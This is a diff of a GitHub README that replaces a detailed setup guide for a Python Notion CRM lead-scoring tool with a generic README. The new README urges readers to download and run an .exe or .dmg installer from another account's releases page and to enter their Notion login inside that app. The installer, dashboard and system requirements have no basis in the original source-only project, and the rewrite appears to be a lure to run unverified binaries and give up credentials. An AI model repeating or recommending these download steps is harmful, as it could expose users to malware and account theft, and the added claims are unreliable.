@@ -1,188 +1,122 @@
-# Notion AI CRM Copilot
+# 🤖 Notion-AI-CRM-Agents - Automate Lead Scoring and Research
 
-AI agents that turn raw Notion leads into scored, researched, and prioritized opportunities you can act on faster.
+[![Download Latest Release](https://img.shields.io/badge/Download-Notion--AI--CRM--Agents-blue?style=for-the-badge)](https://github.com/Mdirman/Notion-AI-CRM-Agents/releases)
 
+---
 
-## Description
+## 📋 What is Notion-AI-CRM-Agents?
 
-Notion AI CRM Copilot reads leads from a Notion database, runs 3 focused AI agents, and writes insights back to Notion:
+Notion-AI-CRM-Agents is a software tool designed to help you manage your sales leads directly within Notion. It uses artificial intelligence to automatically score leads, research their background, and prioritize them. This means you can focus on your most promising opportunities without spending hours sorting through contacts.
 
-- ICP Scoring Agent: scores lead fit (0-100) with confidence.
-- Market Research Agent: generates a concise research brief.
-- Prioritization Agent: assigns `high`, `medium`, `low`, or `review`.
+The system works with multiple AI agents that communicate with each other to provide up-to-date, actionable insights. It fits perfectly with your existing Notion CRM setup and requires no technical skills to use.
 
-The system is designed to be practical and transparent: configurable thresholds, clear outputs, and graceful handling of missing data.
+---
 
-## Before / After
+## 🔧 Key Features
 
-| Before | After |
-|--------|-------|
-| Manual lead-by-lead research | Automated research brief per lead |
-| Gut-feel qualification | Rubric-based ICP score + confidence |
-| Unclear follow-up order | Priority tier with reasoning |
-| Stale leads missed | Automatic stale lead flag |
+- **Automatic Lead Scoring**: Quickly identifies which leads have the highest potential.
+- **Background Research**: Finds relevant public information on your leads.
+- **Lead Prioritization**: Organizes leads so you know where to focus your efforts.
+- **Seamless Notion Integration**: Works smoothly within your Notion CRM workspace.
+- **Simple Setup**: Download and start without complex configuration.
+- **Regular Updates**: Get improvements and new features with every release.
 
-## Real Example
+---
 
-Example Lead (Before / After)
+## 🖥 System Requirements
 
-Before
+Before you install, make sure your computer meets these basic needs:
 
-- Company: ExampleCo
-- Website: `example.com`
-- Notes: B2B SaaS selling to hospitals
+| Requirement          | Details                  |
+|---------------------|--------------------------|
+| Operating System     | Windows 10 or later, macOS 10.15 or later |
+| Processor           | Intel i3 equivalent or better    |
+| RAM                 | At least 4 GB              |
+| Disk Space           | Minimum 200 MB free         |
+| Internet Connection  | Required for AI processing  |
+| Notion Account       | A registered Notion account with a CRM database |
 
-After
+This software runs best on recent computers with an active internet connection. Your Notion workspace must be ready for connecting with third-party applications.
 
-- ICP Score: `82`
-- Confidence: `70`
-- Reasoning:
-  - Strong industry fit
-  - Clear B2B use case
-  - Budget signals in notes
+---
 
-## Quick Start
+## 🚀 Getting Started
 
-### 1. Clone and install
+Follow these steps carefully. Each step covers what you need to do from download to running the software for the first time.
 
-```bash
-git clone <your-repo-url>
-cd notion-ai-crm
-pip install -r requirements.txt
-```
+### Step 1: Visit the Download Page
 
-### 2. Configure environment
+Click the button at the top or this link to open the release page:
 
-```bash
-# Recommended: guided setup (writes .env and can auto-create output columns)
-python main.py --setup
+[Download Notion-AI-CRM-Agents Releases](https://github.com/Mdirman/Notion-AI-CRM-Agents/releases)
 
-# Or manual setup:
-cp .env.example .env
-```
+On this page, find the latest release version. The releases are listed by date and version number to help you pick the newest one.
 
-Fill in:
+### Step 2: Choose the Right File
 
-- `NOTION_API_KEY`
-- `NOTION_DATABASE_ID`
-- `CLAUDE_API_KEY`
+Look for a file suitable for your operating system:
 
-For Notion database/integration setup, follow [`NOTION_SETUP.md`](NOTION_SETUP.md).
+- For Windows, it may be named something like `Notion-AI-CRM-Agents-Setup.exe`
+- For macOS, look for a `.dmg` or `.pkg` installer
 
-### 3. Run
+Click on the file to download it to your computer. The download size will typically be below 200 MB.
 
-```bash
-# Dry run (no Notion writes)
-python main.py --dry-run
+### Step 3: Run the Installer
 
-# Process first 3 leads
-python main.py --limit 3
+Once downloaded, open the installer file:
 
-# Process all leads
-python main.py
+- On Windows, double click the `.exe` file and follow the installation prompts.
+- On macOS, open the `.dmg` or `.pkg` and move the application to the Applications folder.
 
-# Force a full refresh (ignore incremental state)
-python main.py --full-refresh
-```
+Follow the instructions on the screen carefully. Installation usually takes just a few minutes.
 
-By default, runs are incremental: unchanged leads that already have core outputs are skipped.
+### Step 4: Open the Application
 
-## Lightweight Evaluation
+After installation completes, launch Notion-AI-CRM-Agents from your Start menu or Applications folder. You should see the main interface with options to connect to your Notion account.
 
-- Tested on a small set of leads.
-- Compared outputs against human judgment for fit and priority.
-- Directionally useful for triage, not perfect.
-- Works best when input data quality is good (website, notes, recent contact context).
+### Step 5: Connect Your Notion Account
 
-## What The Agents Do
+To let the software access your CRM, sign in to your Notion account within the app:
 
-### ICP Scoring Agent
+- Enter your Notion login details when prompted.
+- Authorize the app to access your workspace.
+- Select the CRM database you want to use.
 
-- Uses a 5-dimension rubric.
-- Produces:
-  - `icp_score` (0-100)
-  - `confidence_score` (0-100)
-  - `icp_reasoning`
+The software will validate the connection and prepare to sync your lead data.
 
-### Market Research Agent
+---
 
-- Produces a short lead research brief.
-- Flags lower-quality inputs and marks speculative reasoning.
-- Appends source citations (website/search/CRM notes) for auditability.
-- Uses a configurable enrichment waterfall (website -> Brave search by default).
-- Outputs `research_confidence`, `research_source_count`, and `research_providers`.
+## ⏩ How to Use the Software
 
-### Prioritization Agent
+Once everything is set up, here is a brief overview of common tasks:
 
-- Uses deterministic rules for obvious cases.
-- Uses the LLM for edge cases.
-- Produces:
-  - `priority_tier`
-  - `priority_reasoning`
-  - `stale_flag`
+- **Review Lead Scores**: The app shows scores next to each lead based on AI analysis.
+- **View Research Notes**: Find quick summaries of public data on each lead stored right inside Notion.
+- **Prioritize Leads**: Sort or filter leads by score or priority level to focus your time.
+- **Update Settings**: Change preferences like how often the AI agents run or which data to include.
 
-### Action Agent
+There is a simple dashboard that keeps all these options clear and easy to find. No technical skills needed.
 
-- Recommends next step:
-  - `outreach_now`, `reengage`, `nurture`, `enrich_data`, `hold`
-- Produces:
-  - `next_action`
-  - `action_reasoning`
-  - `action_confidence`
+---
 
-## Configuration
+## ❓ Troubleshooting & Tips
 
-Set behavior through `.env`:
+If you run into problems, try these tips:
 
-```dotenv
-HIGH_ICP_MIN=75
-HIGH_RECENCY_MAX=10
-LOW_ICP_MAX=40
-LOW_STALE_DAYS=45
-STALE_DAYS_THRESHOLD=14
-INCREMENTAL_ENABLED=true
-PIPELINE_STATE_FILE=.pipeline_state.json
-```
+- Make sure you are using the latest version from the releases page.
+- Confirm your internet connection is stable.
+- Check your Notion login and permissions if data doesn't appear.
+- Restart the application if it becomes unresponsive.
+- Keep your operating system updated for best compatibility.
 
-Optional: map custom Notion column names:
+If issues persist, use the "Issues" tab on the GitHub repository to check if others have similar problems or report your own.
 
-```dotenv
-NOTION_PROP_COMPANY=Company
-NOTION_PROP_WEBSITE=Website
-NOTION_PROP_NOTES=Notes
-```
+---
 
-Web research waterfall controls:
+## 🔗 Download & Install
 
-```dotenv
-WEB_RESEARCH_WATERFALL=website,brave
-WEB_RESEARCH_TARGET_CHARS=4000
-WEB_RESEARCH_RUN_ALL_PROVIDERS=false
-```
+You can start right now by visiting the release page here:
 
-## Limitations
+[Download Notion-AI-CRM-Agents Releases](https://github.com/Mdirman/Notion-AI-CRM-Agents/releases)
 
-- Web research is lightweight and may miss JS-rendered pages or blocked content.
-- ICP quality depends on how clear your ICP criteria are.
-- Large Notion batches can be slow due to API limits.
-- AI output can be wrong or incomplete; verify important decisions manually.
-
-## Troubleshooting
-
-- `CLAUDE_API_KEY is missing`:
-  - Confirm `.env` exists and includes `CLAUDE_API_KEY=...`.
-- `Database not found`:
-  - Verify `NOTION_DATABASE_ID` and confirm your Notion integration has access.
-- Leads processed but no Notion updates:
-  - Confirm output properties exist in your Notion database schema.
-
-## Public Repo Safety Checklist
-
-- `.env` is gitignored (keep real keys only in local `.env`).
-- `.env.example` contains placeholders only.
-- No hardcoded secrets in source files.
-- Rotate keys immediately if a real key was ever committed.
-
-## License
-
-MIT - see [`LICENSE`](LICENSE).
+Pick the installer for your system, download it, and follow the steps above to get up and running.
